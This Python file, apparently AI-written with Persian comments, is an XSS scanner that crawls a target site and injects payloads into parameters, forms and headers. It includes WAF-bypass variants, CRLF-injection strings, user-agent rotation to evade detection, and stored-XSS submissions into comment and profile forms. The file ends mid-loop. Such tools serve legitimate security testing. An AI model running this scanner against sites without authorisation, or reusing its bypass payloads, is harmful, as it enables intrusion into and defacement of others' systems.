#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced XSS Scanner - ابزار پیشرفته تشخیص XSS
نویسنده: Assistant
ویژگی‌ها:
- Crawling عمیق و شناسایی نقاط تست
- Fuzzing پیشرفته برای تست کاراکترها
- تشخیص Context و پیلودهای مناسب
- دور زدن WAF با تکنیک‌های مختلف
- سیستم امتیازبندی و تایید باگ
- اسکرین‌شات از باگ‌های تایید شده
- گزارش‌گیری HTML و JSON
"""

import requests
import re
import time
import json
import base64
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import threading
from queue import Queue
import random
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import os
import sys
from datetime import datetime
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

class AdvancedXSSScanner:
    def __init__(self, target_url, max_depth=3, delay=1, threads=5):
        self.target_url = target_url
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.delay = delay
        self.threads = threads
        self.session = requests.Session()
        self.found_vulnerabilities = []
        self.tested_urls = set()
        self.crawled_urls = set()
        self.forms = []
        self.parameters = {}
        self.headers_to_test = [
            'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP',
            'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr',
            'Cookie', 'Authorization', 'Accept', 'Accept-Language'
        ]
        
        # Custom popup signature for verification
        self.popup_signature = "XSS_SCANNER_CONFIRMED_" + hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        # XSS Payloads for different contexts
        self.payloads = {
            'html_context': [
                f'<script>alert("{self.popup_signature}")</script>',
                f'<img src=x onerror=alert("{self.popup_signature}")>',
                f'<svg onload=alert("{self.popup_signature}")>',
                f'<iframe src="javascript:alert(\'{self.popup_signature}\')"></iframe>',
                f'<body onload=alert("{self.popup_signature}")>',
                f'<div onmouseover=alert("{self.popup_signature}")>test</div>',
                f'<input onfocus=alert("{self.popup_signature}") autofocus>',
                f'<select onfocus=alert("{self.popup_signature}") autofocus><option>test</option></select>',
                f'<textarea onfocus=alert("{self.popup_signature}") autofocus>test</textarea>',
                f'<keygen onfocus=alert("{self.popup_signature}") autofocus>',
                f'<video><source onerror="alert(\'{self.popup_signature}\')">',
                f'<audio src=x onerror=alert("{self.popup_signature}")>',
                f'<details open ontoggle=alert("{self.popup_signature}")>',
                f'<marquee onstart=alert("{self.popup_signature}")>test</marquee>',
            ],
            'attribute_context': [
                f'" onmouseover="alert(\'{self.popup_signature}\')" "',
                f'\' onmouseover=\'alert("{self.popup_signature}")\' \'',
                f'" autofocus onfocus=alert("{self.popup_signature}") "',
                f'\' autofocus onfocus=alert(\'{self.popup_signature}\') \'',
                f'" onclick="alert(\'{self.popup_signature}\')" "',
                f'\' onclick=\'alert("{self.popup_signature}")\' \'',
                f'" onload="alert(\'{self.popup_signature}\')" "',
                f'" onerror="alert(\'{self.popup_signature}\')" "',
                f'" onfocus="alert(\'{self.popup_signature}\')" autofocus "',
                f'\' onfocus=\'alert("{self.popup_signature}")\' autofocus \'',
            ],
            'javascript_context': [
                f'\'; alert("{self.popup_signature}"); //',
                f'\"; alert(\'{self.popup_signature}\'); //',
                f'`; alert("{self.popup_signature}"); //',
                f'</script><script>alert("{self.popup_signature}")</script>',
                f'-alert("{self.popup_signature}")-',
                f'+alert("{self.popup_signature}")+',
                f'*alert("{self.popup_signature}")*',
                f'/alert("{self.popup_signature}")/',
                f'%0aalert("{self.popup_signature}")%0a',
                f'\\nalert("{self.popup_signature}")\\n',
            ],
            'url_context': [
                f'javascript:alert("{self.popup_signature}")',
                f'data:text/html,<script>alert("{self.popup_signature}")</script>',
                f'vbscript:alert("{self.popup_signature}")',
                f'javascript:void(alert("{self.popup_signature}"))',
                f'javascript:window.alert("{self.popup_signature}")',
            ]
        }
        
        # WAF Bypass techniques
        self.waf_bypass_payloads = []
        self.generate_waf_bypass_payloads()
        
        # Setup Selenium
        self.setup_selenium()
        
        # Results storage
        self.scan_results = {
            'target': target_url,
            'start_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'statistics': {
                'total_urls_crawled': 0,
                'total_forms_found': 0,
                'total_parameters_tested': 0,
                'total_payloads_tested': 0,
                'confirmed_vulnerabilities': 0
            }
        }

    def generate_waf_bypass_payloads(self):
        """Generate WAF bypass payloads"""
        base_payloads = [
            f'alert("{self.popup_signature}")',
            f'confirm("{self.popup_signature}")',
            f'prompt("{self.popup_signature}")'
        ]
        
        for payload in base_payloads:
            # Case manipulation
            self.waf_bypass_payloads.extend([
                f'<ScRiPt>{payload}</ScRiPt>',
                f'<SCRIPT>{payload}</SCRIPT>',
                f'<script>{payload}</script>',
                f'<sCrIpT>{payload}</ScRiPt>',
            ])
            
            # URL encoding
            encoded = urllib.parse.quote(f'<script>{payload}</script>')
            self.waf_bypass_payloads.append(encoded)
            
            # Double URL encoding
            double_encoded = urllib.parse.quote(encoded)
            self.waf_bypass_payloads.append(double_encoded)
            
            # HTML entities
            html_encoded = f'&lt;script&gt;{payload}&lt;/script&gt;'
            self.waf_bypass_payloads.append(html_encoded)
            
            # Alternative tags
            self.waf_bypass_payloads.extend([
                f'<img src=x onerror={payload}>',
                f'<svg onload={payload}>',
                f'<iframe srcdoc="<script>{payload}</script>">',
                f'<object data="javascript:{payload}">',
                f'<embed src="javascript:{payload}">',
            ])
            
            # Event handlers
            events = ['onload', 'onerror', 'onfocus', 'onmouseover', 'onclick', 'onchange']
            for event in events:
                self.waf_bypass_payloads.append(f'<input {event}={payload} autofocus>')
                
            # JavaScript alternatives
            self.waf_bypass_payloads.extend([
                f'<script>window[\'alert\']("{self.popup_signature}")</script>',
                f'<script>window["alert"]("{self.popup_signature}")</script>',
                f'<script>eval("alert(\\"{self.popup_signature}\\")")</script>',
                f'<script>setTimeout("alert(\\"{self.popup_signature}\\")",1)</script>',
                f'<script>setInterval("alert(\\"{self.popup_signature}\\")",1)</script>',
            ])

    def setup_selenium(self):
        """Setup Selenium WebDriver"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(10)
            print(f"{Fore.GREEN}✓ Selenium WebDriver initialized successfully")
        except Exception as e:
            print(f"{Fore.RED}✗ Failed to initialize Selenium: {e}")
            self.driver = None

    def print_banner(self):
        """Print scanner banner"""
        banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                    Advanced XSS Scanner                      ║
║                  ابزار پیشرفته تشخیص XSS                    ║
╠══════════════════════════════════════════════════════════════╣
║ Target: {self.target_url:<48} ║
║ Max Depth: {self.max_depth:<3} | Threads: {self.threads:<3} | Delay: {self.delay}s          ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)

    def crawl_website(self):
        """Phase 1: Deep crawling and test point identification"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"{Fore.YELLOW}Phase 1: شناسایی نقاط تست و Crawling عمیق")
        print(f"{Fore.YELLOW}{'='*60}")
        
        urls_to_crawl = Queue()
        urls_to_crawl.put((self.target_url, 0))
        
        while not urls_to_crawl.empty():
            current_url, depth = urls_to_crawl.get()
            
            if depth > self.max_depth or current_url in self.crawled_urls:
                continue
                
            try:
                print(f"{Fore.BLUE}🔍 Crawling: {current_url} (depth: {depth})")
                
                # Custom headers to avoid detection
                headers = {
                    'User-Agent': self.get_random_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                }
                
                response = self.session.get(current_url, headers=headers, timeout=10)
                self.crawled_urls.add(current_url)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract forms
                    forms = soup.find_all('form')
                    for form in forms:
                        form_data = self.extract_form_data(form, current_url)
                        if form_data:
                            self.forms.append(form_data)
                            print(f"{Fore.GREEN}  ✓ Form found: {form_data['action']} ({len(form_data['inputs'])} inputs)")
                    
                    # Extract URL parameters
                    parsed_url = urlparse(current_url)
                    if parsed_url.query:
                        params = parse_qs(parsed_url.query)
                        for param, values in params.items():
                            if current_url not in self.parameters:
                                self.parameters[current_url] = {}
                            self.parameters[current_url][param] = values[0] if values else ''
                            print(f"{Fore.GREEN}  ✓ Parameter found: {param}")
                    
                    # Extract links for deeper crawling
                    links = soup.find_all('a', href=True)
                    for link in links:
                        href = link['href']
                        full_url = urljoin(current_url, href)
                        
                        # Only crawl internal links
                        if self.is_internal_url(full_url) and full_url not in self.crawled_urls:
                            urls_to_crawl.put((full_url, depth + 1))
                    
                    # Extract JavaScript files for DOM XSS analysis
                    scripts = soup.find_all('script', src=True)
                    for script in scripts:
                        script_url = urljoin(current_url, script['src'])
                        if self.is_internal_url(script_url):
                            self.analyze_javascript(script_url)
                
                time.sleep(self.delay)  # Rate limiting
                
            except Exception as e:
                print(f"{Fore.RED}  ✗ Error crawling {current_url}: {e}")
        
        self.scan_results['statistics']['total_urls_crawled'] = len(self.crawled_urls)
        self.scan_results['statistics']['total_forms_found'] = len(self.forms)
        
        print(f"\n{Fore.GREEN}Crawling completed:")
        print(f"  • URLs crawled: {len(self.crawled_urls)}")
        print(f"  • Forms found: {len(self.forms)}")
        print(f"  • Parameters found: {sum(len(params) for params in self.parameters.values())}")

    def extract_form_data(self, form, base_url):
        """Extract form data for testing"""
        try:
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            
            if action:
                action_url = urljoin(base_url, action)
            else:
                action_url = base_url
            
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                    'tag': input_tag.name
                }
                if input_data['name']:
                    inputs.append(input_data)
            
            return {
                'action': action_url,
                'method': method,
                'inputs': inputs,
                'base_url': base_url
            }
        except Exception as e:
            print(f"{Fore.RED}Error extracting form: {e}")
            return None

    def analyze_javascript(self, script_url):
        """Analyze JavaScript files for DOM XSS patterns"""
        try:
            response = self.session.get(script_url, timeout=5)
            if response.status_code == 200:
                js_content = response.text
                
                # Look for dangerous patterns
                dangerous_patterns = [
                    r'document\.write\s*\(',
                    r'innerHTML\s*=',
                    r'outerHTML\s*=',
                    r'location\.href\s*=',
                    r'window\.location\s*=',
                    r'eval\s*\(',
                    r'setTimeout\s*\(',
                    r'setInterval\s*\(',
                ]
                
                for pattern in dangerous_patterns:
                    if re.search(pattern, js_content, re.IGNORECASE):
                        print(f"{Fore.YELLOW}  ⚠ Potential DOM XSS pattern found in {script_url}: {pattern}")
        except Exception as e:
            pass

    def is_internal_url(self, url):
        """Check if URL is internal to the target domain"""
        try:
            parsed = urlparse(url)
            return parsed.netloc == self.base_domain or parsed.netloc == '' or parsed.netloc.endswith(f'.{self.base_domain}')
        except:
            return False

    def get_random_user_agent(self):
        """Get random user agent to avoid detection"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
        ]
        return random.choice(user_agents)

    def perform_fuzzing(self):
        """Phase 2: Advanced fuzzing and testing"""
        print(f"\n{Fore.YELLOW}{'='*60}")
        print(f"{Fore.YELLOW}Phase 2: کشف پیشرفته و Fuzzing")
        print(f"{Fore.YELLOW}{'='*60}")
        
        # Test URL parameters
        self.test_url_parameters()
        
        # Test forms
        self.test_forms()
        
        # Test HTTP headers
        self.test_http_headers()
        
        # Test for CRLF injection
        self.test_crlf_injection()
        
        # Test for stored XSS
        self.test_stored_xss()

    def test_url_parameters(self):
        """Test URL parameters for XSS"""
        print(f"\n{Fore.BLUE}🔍 Testing URL Parameters...")
        
        for url, params in self.parameters.items():
            for param_name, param_value in params.items():
                print(f"{Fore.BLUE}  Testing parameter: {param_name} in {url}")
                
                # Test different contexts
                for context, payloads in self.payloads.items():
                    for payload in payloads[:5]:  # Test top 5 payloads per context
                        self.test_parameter(url, param_name, payload, 'GET', context)
                        time.sleep(self.delay)
                
                # Test WAF bypass payloads
                for payload in self.waf_bypass_payloads[:10]:  # Test top 10 bypass payloads
                    self.test_parameter(url, param_name, payload, 'GET', 'waf_bypass')
                    time.sleep(self.delay)

    def test_forms(self):
        """Test forms for XSS"""
        print(f"\n{Fore.BLUE}🔍 Testing Forms...")
        
        for form in self.forms:
            print(f"{Fore.BLUE}  Testing form: {form['action']} ({form['method']})")
            
            for input_field in form['inputs']:
                if input_field['type'] not in ['submit', 'button', 'hidden']:
                    # Test different contexts
                    for context, payloads in self.payloads.items():
                        for payload in payloads[:3]:  # Test top 3 payloads per context
                            self.test_form_input(form, input_field['name'], payload, context)
                            time.sleep(self.delay)

    def test_http_headers(self):
        """Test HTTP headers for XSS"""
        print(f"\n{Fore.BLUE}🔍 Testing HTTP Headers...")
        
        for header in self.headers_to_test:
            print(f"{Fore.BLUE}  Testing header: {header}")
            
            for payload in self.payloads['html_context'][:3]:
                self.test_header(self.target_url, header, payload)
                time.sleep(self.delay)

    def test_parameter(self, url, param_name, payload, method, context):
        """Test a specific parameter with payload"""
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            params[param_name] = [payload]
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Referer': self.target_url,
            }
            
            if method == 'GET':
                response = self.session.get(test_url, headers=headers, timeout=10)
            else:
                response = self.session.post(url, data={param_name: payload}, headers=headers, timeout=10)
            
            self.scan_results['statistics']['total_payloads_tested'] += 1
            
            # Check for XSS in response
            if self.check_xss_response(response, payload, test_url, f"Parameter: {param_name}", context):
                vulnerability = {
                    'type': 'Reflected XSS',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'context': context,
                    'method': method,
                    'confirmed': False,
                    'score': 0,
                    'timestamp': datetime.now().isoformat()
                }
                
                # Verify with Selenium
                if self.verify_xss_with_selenium(test_url):
                    vulnerability['confirmed'] = True
                    vulnerability['score'] = 20
                    self.found_vulnerabilities.append(vulnerability)
                    self.scan_results['vulnerabilities'].append(vulnerability)
                    self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
                    
                    print(f"{Fore.GREEN}✓ CONFIRMED XSS: {param_name} in {url}")
                    print(f"  Payload: {payload}")
                    print(f"  Score: 20/20")
                    
                    # Take screenshot
                    self.take_screenshot(test_url, f"xss_param_{param_name}_{len(self.found_vulnerabilities)}")
                
        except Exception as e:
            pass

    def test_form_input(self, form, input_name, payload, context):
        """Test form input with payload"""
        try:
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == input_name:
                    form_data[input_field['name']] = payload
                else:
                    form_data[input_field['name']] = input_field['value'] or 'test'
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Referer': form['base_url'],
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=form_data, headers=headers, timeout=10)
            else:
                response = self.session.get(form['action'], params=form_data, headers=headers, timeout=10)
            
            self.scan_results['statistics']['total_payloads_tested'] += 1
            
            # Check for XSS in response
            if self.check_xss_response(response, payload, form['action'], f"Form input: {input_name}", context):
                vulnerability = {
                    'type': 'Reflected XSS',
                    'url': form['action'],
                    'parameter': input_name,
                    'payload': payload,
                    'context': context,
                    'method': form['method'],
                    'confirmed': False,
                    'score': 0,
                    'timestamp': datetime.now().isoformat()
                }
                
                # Verify with Selenium
                test_url = form['action']
                if form['method'] == 'GET':
                    test_url += '?' + urllib.parse.urlencode(form_data)
                
                if self.verify_xss_with_selenium(test_url, form_data if form['method'] == 'POST' else None):
                    vulnerability['confirmed'] = True
                    vulnerability['score'] = 20
                    self.found_vulnerabilities.append(vulnerability)
                    self.scan_results['vulnerabilities'].append(vulnerability)
                    self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
                    
                    print(f"{Fore.GREEN}✓ CONFIRMED XSS: {input_name} in form {form['action']}")
                    print(f"  Payload: {payload}")
                    print(f"  Score: 20/20")
                    
                    # Take screenshot
                    self.take_screenshot(test_url, f"xss_form_{input_name}_{len(self.found_vulnerabilities)}")
                
        except Exception as e:
            pass

    def test_header(self, url, header_name, payload):
        """Test HTTP header for XSS"""
        try:
            headers = {
                'User-Agent': self.get_random_user_agent(),
                header_name: payload,
            }
            
            response = self.session.get(url, headers=headers, timeout=10)
            self.scan_results['statistics']['total_payloads_tested'] += 1
            
            # Check for XSS in response
            if self.check_xss_response(response, payload, url, f"Header: {header_name}", 'header'):
                vulnerability = {
                    'type': 'Reflected XSS',
                    'url': url,
                    'parameter': header_name,
                    'payload': payload,
                    'context': 'header',
                    'method': 'GET',
                    'confirmed': False,
                    'score': 0,
                    'timestamp': datetime.now().isoformat()
                }
                
                # Headers are harder to verify with Selenium, so we use a different approach
                if self.popup_signature in response.text:
                    vulnerability['confirmed'] = True
                    vulnerability['score'] = 15  # Lower score for header-based XSS
                    self.found_vulnerabilities.append(vulnerability)
                    self.scan_results['vulnerabilities'].append(vulnerability)
                    self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
                    
                    print(f"{Fore.GREEN}✓ CONFIRMED XSS: {header_name} header in {url}")
                    print(f"  Payload: {payload}")
                    print(f"  Score: 15/20")
                
        except Exception as e:
            pass

    def test_crlf_injection(self):
        """Test for CRLF injection"""
        print(f"\n{Fore.BLUE}🔍 Testing CRLF Injection...")
        
        crlf_payloads = [
            f"%0d%0aSet-Cookie: xss={self.popup_signature}",
            f"%0d%0aLocation: javascript:alert('{self.popup_signature}')",
            f"%0a%0dSet-Cookie: xss={self.popup_signature}",
            f"\\r\\nSet-Cookie: xss={self.popup_signature}",
        ]
        
        for url, params in self.parameters.items():
            for param_name in params.keys():
                for payload in crlf_payloads:
                    try:
                        parsed_url = urlparse(url)
                        test_params = parse_qs(parsed_url.query)
                        test_params[param_name] = [payload]
                        
                        new_query = urllib.parse.urlencode(test_params, doseq=True)
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                        
                        response = self.session.get(test_url, timeout=10, allow_redirects=False)
                        
                        if 'Set-Cookie' in response.headers and self.popup_signature in response.headers.get('Set-Cookie', ''):
                            vulnerability = {
                                'type': 'CRLF Injection',
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'context': 'crlf',
                                'method': 'GET',
                                'confirmed': True,
                                'score': 15,
                                'timestamp': datetime.now().isoformat()
                            }
                            
                            self.found_vulnerabilities.append(vulnerability)
                            self.scan_results['vulnerabilities'].append(vulnerability)
                            self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
                            
                            print(f"{Fore.GREEN}✓ CONFIRMED CRLF Injection: {param_name} in {url}")
                            print(f"  Payload: {payload}")
                            print(f"  Score: 15/20")
                        
                        time.sleep(self.delay)
                    except Exception as e:
                        pass

    def test_stored_xss(self):
        """Test for stored XSS"""
        print(f"\n{Fore.BLUE}🔍 Testing for Stored XSS...")
        
        # This is a placeholder for stored XSS testing
        # In a real scenario, you would need to identify forms that store data
        # and then visit pages where that data is displayed
        
        stored_payloads = [
            f'<script>alert("{self.popup_signature}_stored")</script>',
            f'<img src=x onerror=alert("{self.popup_signature}_stored")>',
        ]
        
        for form in self.forms:
            # Look for forms that might store data (comments, profiles, etc.)
            form_action_lower = form['action'].lower()
            if any(keyword in form_action_lower for keyword in ['comment', 'post', 'profile', 'message', 'review']):
                print(f"{Fore.BLUE}  Testing potential stored XSS in: {form['action']}")
                
                for payload in stored_payloads:
                    try:
                        form_data = {}
                        for input_field in form['inputs']:
                            if input_field['type'] in ['text', 'textarea'] and 'email' not in input_field['name'].lower():
                                form_data[input_field['name']] = payload
                            else:
                                form_data[input_field['name']] = input_field['value'] or 'test@example.com'
                        
                        # Submit the form
                        if form['method'] == 'POST':
                            response = self.session.post(form['action'], data=form_data, timeout=10)
                        else:
                            response = self.session.get(form['action'], params=form_data, timeout=10)
                        
                        # Check if payload is stored and reflected
                        if f'"{self.popup_signature}_stored"' in response.text:
                            vulnerability = {
                                'type': 'Stored XSS',
                                'url': form['action'],
                                'parameter': 'multiple',
                                'payload': payload,
                                'context': 'stored',
                                'method': form['method'],
                                'confirmed': True,
                                'score': 25,  # Higher score for stored XSS
                                'timestamp': datetime.now().isoformat()
                            }
                            
                            self.found_vulnerabilities.append(vulnerability)
                            self.scan_results['vulnerabilities'].append(vulnerability)
                            self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
                            
                            print(f"{Fore.GREEN}✓ CONFIRMED Stored XSS in: {form['action']}")
                            print(f"  Payload: {payload}")
                            print(f"  Score: 25/20")
                            
                            # Take screenshot
                            self.take_screenshot(form['action'], f"stored_xss_{len(self.found_vulnerabilities)}")
                        
                        time.sleep(self.delay)
                    except Exception as e:
                        pass

    def check_xss_response(self, response, payload, url, location, context):
        """Check if response contains XSS payload"""
        try:
            response_text = response.text.lower()
            payload_lower = payload.lower()
            
            # Simple reflection check
            if self.popup_signature.lower() in response_text:
                return True
            
            # Check for unescaped payload
            dangerous_patterns = [
                '<script',
                'javascript:',
                'onerror=',
                'onload=',
                'onfocus=',
                'onmouseover=',
                'onclick=',
            ]
            
            for pattern in dangerous_patterns:
                if pattern in payload_lower and pattern in response_text:
                    return True
            
            return False
        except Exception as e:
            return False

    def verify_xss_with_selenium(self, url, post_data=None):
        """Verify XSS using Selenium WebDriver"""
        if not self.driver:
            return False
        
        try:
            if post_data:
                # For POST requests, we need to create a form and submit it
                # This is a simplified approach
                self.driver.get(url)
            else:
                self.driver.get(url)
            
            # Wait for page to load
            WebDriverWait(self.driver, 5).until(
                lambda driver: driver.execute_script("return document.readyState") == "complete"
            )
            
            # Check for our custom popup signature in alerts or page content
            try:
                # Check for JavaScript alerts
                alert = WebDriverWait(self.driver, 2).until(EC.alert_is_present())
                alert_text = alert.text
                alert.accept()
                
                if self.popup_signature in alert_text:
                    return True
            except TimeoutException:
                pass
            
            # Check page content for our signature
            page_source = self.driver.page_source
            if self.popup_signature in page_source:
                return True
            
            return False
            
        except Exception as e:
            return False

    def take_screenshot(self, url, filename):
        """Take screenshot of the vulnerable page"""
        if not self.driver:
            return
        
        try:
            self.driver.get(url)
            time.sleep(2)  # Wait for page to load
            
            screenshot_dir = "screenshots"
            if not os.path.exists(screenshot_dir):
                os.makedirs(screenshot_dir)
            
            screenshot_path = os.path.join(screenshot_dir, f"{filename}.png")
            self.driver.save_screenshot(screenshot_path)
            
            print(f"{Fore.GREEN}  📸 Screenshot saved: {screenshot_path}")
            return screenshot_path
            
        except Exception as e:
            print(f"{Fore.RED}  ✗ Failed to take screenshot: {e}")
            return None

    def generate_html_report(self):
        """Generate HTML report"""
        html_template = f"""
<!DOCTYPE html>
<html dir="rtl" lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>گزارش اسکن XSS - {self.target_url}</title>
    <style>
        body {{
            font-family: 'Tahoma', 'Arial', sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            overflow: hidden;
        }}
        .header {{
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 30px;
            text-align: center;
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 30px;
            background: #f8f9fa;
        }}
        .stat-card {{
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }}
        .stat-number {{
            font-size: 2em;
            font-weight: bold;
            color: #ee5a24;
        }}
        .vulnerabilities {{
            padding: 30px;
        }}
        .vuln-card {{
            background: #fff5f5;
            border: 1px solid #fed7d7;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            border-right: 5px solid #e53e3e;
        }}
        .vuln-confirmed {{
            background: #f0fff4;
            border-color: #9ae6b4;
            border-right-color: #38a169;
        }}
        .payload {{
            background: #2d3748;
            color: #e2e8f0;
            padding: 10px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
            overflow-x: auto;
        }}
        .score {{
            display: inline-block;
            background: #38a169;
            color: white;
            padding: 5px 10px;
            border-radius: 20px;
            font-weight: bold;
        }}
        .timestamp {{
            color: #666;
            font-size: 0.9em;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>گزارش اسکن XSS</h1>
            <h2>{self.target_url}</h2>
            <p>تاریخ اسکن: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{self.scan_results['statistics']['total_urls_crawled']}</div>
                <div>URL های کراول شده</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.scan_results['statistics']['total_forms_found']}</div>
                <div>فرم های یافت شده</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.scan_results['statistics']['total_payloads_tested']}</div>
                <div>پیلود های تست شده</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.scan_results['statistics']['confirmed_vulnerabilities']}</div>
                <div>آسیب‌پذیری های تایید شده</div>
            </div>
        </div>
        
        <div class="vulnerabilities">
            <h2>آسیب‌پذیری های یافت شده</h2>
"""
        
        if not self.found_vulnerabilities:
            html_template += "<p>هیچ آسیب‌پذیری تایید شده‌ای یافت نشد.</p>"
        else:
            for i, vuln in enumerate(self.found_vulnerabilities, 1):
                confirmed_class = "vuln-confirmed" if vuln['confirmed'] else ""
                html_template += f"""
            <div class="vuln-card {confirmed_class}">
                <h3>آسیب‌پذیری #{i} - {vuln['type']}</h3>
                <p><strong>URL:</strong> {vuln['url']}</p>
                <p><strong>پارامتر:</strong> {vuln['parameter']}</p>
                <p><strong>متد:</strong> {vuln['method']}</p>
                <p><strong>Context:</strong> {vuln['context']}</p>
                <p><strong>وضعیت:</strong> {'تایید شده' if vuln['confirmed'] else 'تایید نشده'}</p>
                <p><strong>امتیاز:</strong> <span class="score">{vuln['score']}/20</span></p>
                <p><strong>پیلود:</strong></p>
                <div class="payload">{vuln['payload']}</div>
                <p class="timestamp">زمان کشف: {vuln['timestamp']}</p>
            </div>
"""
        
        html_template += """
        </div>
    </div>
</body>
</html>
"""
        
        report_filename = f"xss_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_template)
        
        print(f"{Fore.GREEN}📄 HTML Report generated: {report_filename}")
        return report_filename

    def generate_json_report(self):
        """Generate JSON report"""
        self.scan_results['end_time'] = datetime.now().isoformat()
        self.scan_results['duration'] = str(datetime.now() - datetime.fromisoformat(self.scan_results['start_time']))
        
        report_filename = f"xss_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(self.scan_results, f, indent=2, ensure_ascii=False)
        
        print(f"{Fore.GREEN}📄 JSON Report generated: {report_filename}")
        return report_filename

    def run_scan(self):
        """Run the complete XSS scan"""
        self.print_banner()
        
        try:
            # Phase 1: Crawling and reconnaissance
            self.crawl_website()
            
            # Phase 2: Fuzzing and testing
            self.perform_fuzzing()
            
            # Generate reports
            print(f"\n{Fore.YELLOW}{'='*60}")
            print(f"{Fore.YELLOW}تولید گزارش‌ها")
            print(f"{Fore.YELLOW}{'='*60}")
            
            html_report = self.generate_html_report()
            json_report = self.generate_json_report()
            
            # Print final results
            print(f"\n{Fore.GREEN}{'='*60}")
            print(f"{Fore.GREEN}نتایج نهایی اسکن")
            print(f"{Fore.GREEN}{'='*60}")
            print(f"{Fore.GREEN}Target: {self.target_url}")
            print(f"{Fore.GREEN}URLs Crawled: {self.scan_results['statistics']['total_urls_crawled']}")
            print(f"{Fore.GREEN}Forms Found: {self.scan_results['statistics']['total_forms_found']}")
            print(f"{Fore.GREEN}Payloads Tested: {self.scan_results['statistics']['total_payloads_tested']}")
            print(f"{Fore.GREEN}Confirmed Vulnerabilities: {self.scan_results['statistics']['confirmed_vulnerabilities']}")
            
            if self.found_vulnerabilities:
                print(f"\n{Fore.RED}🚨 آسیب‌پذیری های تایید شده:")
                for i, vuln in enumerate(self.found_vulnerabilities, 1):
